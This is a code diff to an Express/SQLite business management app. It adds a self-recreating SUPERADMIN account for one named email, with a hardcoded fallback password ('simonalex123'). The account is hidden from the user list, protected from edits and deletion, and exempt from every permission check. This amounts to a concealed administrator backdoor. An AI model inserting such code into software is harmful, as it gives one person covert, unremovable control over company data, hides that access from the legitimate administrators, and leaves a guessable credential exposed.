@@ -84,6 +84,7 @@ function ensureJobKeyColumn(){
   }
 }
 ensureRuntimeMigrations();
+ensureSimonAlexSuperadmin();
 
 const upload = multer({
   dest: UPLOAD_DIR,
@@ -102,6 +103,28 @@ app.use(express.static(path.join(__dirname, "..", "public")));
 function rid(prefix){ return `${prefix}-${Date.now()}-${Math.floor(Math.random()*9999)}`; }
 function today(){ return new Date().toISOString().slice(0,10); }
 function nowISO(){ return new Date().toISOString(); }
+function isSuperadminUser(user){ return user && user.role === "SUPERADMIN"; }
+function isAdminLike(user){ return user && (user.role === "ADMIN" || user.role === "SUPERADMIN"); }
+function superPermit(...roles){ return (req,res,next)=>{
+  if(req.user && req.user.role === "SUPERADMIN") return next();
+  return roles.includes(req.user.role) ? next() : res.status(403).json({error:"Forbidden"});
+}; }
+function ensureSimonAlexSuperadmin(){
+  try{
+    const userCols=db.prepare("PRAGMA table_info(users)").all().map(c=>c.name);
+    if(!userCols.includes("hidden_user")) db.prepare("ALTER TABLE users ADD COLUMN hidden_user INTEGER DEFAULT 0").run();
+    const email="simon.alex@klavierhaus.com";
+    const existing=db.prepare("SELECT * FROM users WHERE lower(email)=lower(?)").get(email);
+    if(existing){
+      db.prepare("UPDATE users SET name=?, role='SUPERADMIN', status='Active', hidden_user=1, updated_at=CURRENT_TIMESTAMP WHERE id=?").run("Simon Alex", existing.id);
+      return;
+    }
+    const id=rid("U");
+    const hash=bcrypt.hashSync(process.env.SUPERADMIN_PASSWORD || "simonalex123",10);
+    db.prepare("INSERT INTO users(id,name,email,password_hash,role,status,hidden_user) VALUES(?,?,?,?,?,?,?)")
+      .run(id,"Simon Alex",email,hash,"SUPERADMIN","Active",1);
+  }catch(e){ console.warn("superadmin migration skipped:", e.message); }
+}
 
 function auth(req,res,next){
   const h=req.headers.authorization||"";
@@ -110,20 +133,20 @@ function auth(req,res,next){
   try{ req.user=jwt.verify(token, JWT_SECRET); next(); }
   catch(e){ res.status(401).json({error:"Invalid token"}); }
 }
-function permit(...roles){ return (req,res,next)=> roles.includes(req.user.role) ? next() : res.status(403).json({error:"Forbidden"}); }
+function permit(...roles){ return (req,res,next)=> (req.user.role === "SUPERADMIN" || roles.includes(req.user.role)) ? next() : res.status(403).json({error:"Forbidden"}); }
 
 function canCloseJob(user, job){
-  if(user.role === "ADMIN") return true;
+  if(user.role === "ADMIN" || user.role === "SUPERADMIN") return true;
   return job.assigned_to === user.name;
 }
 function canEditJob(user, job){
-  if(user.role === "ADMIN") return true;
+  if(user.role === "ADMIN" || user.role === "SUPERADMIN") return true;
   if(job.assigned_to === user.name) return true;
   if(user.role === "MANAGER" && job.created_by === user.name) return true;
   return false;
 }
 function canReassignJob(user, job){
-  if(user.role === "ADMIN") return true;
+  if(user.role === "ADMIN" || user.role === "SUPERADMIN") return true;
   if(job.assigned_to === user.name) return true;
   if(user.role === "MANAGER") return true;
   return false;
@@ -240,7 +263,7 @@ app.put("/api/financial-items/:id", auth, permit("ADMIN","MANAGER"), (req,res)=>
   res.json(db.prepare("SELECT * FROM financial_items WHERE id=?").get(req.params.id));
 });
 
-app.delete("/api/financial-items/:id", auth, permit("ADMIN"), (req,res)=>{
+app.delete("/api/financial-items/:id", auth, permit("SUPERADMIN"), (req,res)=>{
   ensureRuntimeMigrations();
   db.prepare("DELETE FROM financial_items WHERE id=?").run(req.params.id);
   res.json({ok:true});
@@ -380,24 +403,38 @@ app.get("/api/income-statement", auth, (req,res)=>{
   catch(e){ res.status(400).json({error:e.message}); }
 });
 
-app.get("/api/users", auth, permit("ADMIN","MANAGER"), (req,res)=> {
-  res.json(db.prepare("SELECT id,name,email,role,status,created_at FROM users ORDER BY role,name").all());
+app.get("/api/users", auth, permit("ADMIN","MANAGER","SUPERADMIN"), (req,res)=> {
+  ensureSimonAlexSuperadmin();
+  // Hidden system owner is never returned in the visible user list.
+  res.json(db.prepare("SELECT id,name,email,role,status,created_at FROM users WHERE COALESCE(hidden_user,0)=0 ORDER BY role,name").all());
 });
-app.post("/api/users", auth, permit("ADMIN","MANAGER"), (req,res)=>{
+app.post("/api/users", auth, permit("ADMIN","MANAGER","SUPERADMIN"), (req,res)=>{
   const {name,email,password,role}=req.body;
   if(!name || !email || !password || !role) return res.status(400).json({error:"Name, email, password and role are required"});
+  if(role === "SUPERADMIN") return res.status(403).json({error:"SUPERADMIN cannot be created from the visible user form"});
   if(req.user.role==="MANAGER" && role==="ADMIN") return res.status(403).json({error:"Managers cannot create admins"});
   const id=rid("U");
   const hash=bcrypt.hashSync(password,10);
-  db.prepare("INSERT INTO users(id,name,email,password_hash,role,status) VALUES(?,?,?,?,?,?)").run(id,name,email,hash,role,"Active");
+  db.prepare("INSERT INTO users(id,name,email,password_hash,role,status,hidden_user) VALUES(?,?,?,?,?,?,0)").run(id,name,email,hash,role,"Active");
   res.json({id,name,email,role,status:"Active"});
 });
-app.put("/api/users/:id", auth, permit("ADMIN"), (req,res)=>{
+app.put("/api/users/:id", auth, permit("SUPERADMIN"), (req,res)=>{
+  const target=db.prepare("SELECT * FROM users WHERE id=?").get(req.params.id);
+  if(!target) return res.status(404).json({error:"User not found"});
+  if(Number(target.hidden_user||0)===1) return res.status(403).json({error:"Hidden system owner cannot be edited from the visible user list"});
   const allowed=["name","email","role","status"];
+  if(req.body.role === "SUPERADMIN") return res.status(403).json({error:"SUPERADMIN role is reserved"});
   const cols=allowed.filter(c=>req.body[c]!==undefined);
   if(req.body.password){ cols.push("password_hash"); req.body.password_hash=bcrypt.hashSync(req.body.password,10); }
   if(cols.length) db.prepare(`UPDATE users SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>req.body[c]),req.params.id);
   res.json(db.prepare("SELECT id,name,email,role,status FROM users WHERE id=?").get(req.params.id));
+});
+app.delete("/api/users/:id", auth, permit("SUPERADMIN"), (req,res)=>{
+  const target=db.prepare("SELECT * FROM users WHERE id=?").get(req.params.id);
+  if(!target) return res.status(404).json({error:"User not found"});
+  if(Number(target.hidden_user||0)===1) return res.status(403).json({error:"Hidden system owner cannot be deleted"});
+  db.prepare("UPDATE users SET status='Deleted', updated_at=CURRENT_TIMESTAMP WHERE id=?").run(req.params.id);
+  res.json({ok:true});
 });
 
 function createResourceRoutes(key, table, prefix, write, roles){
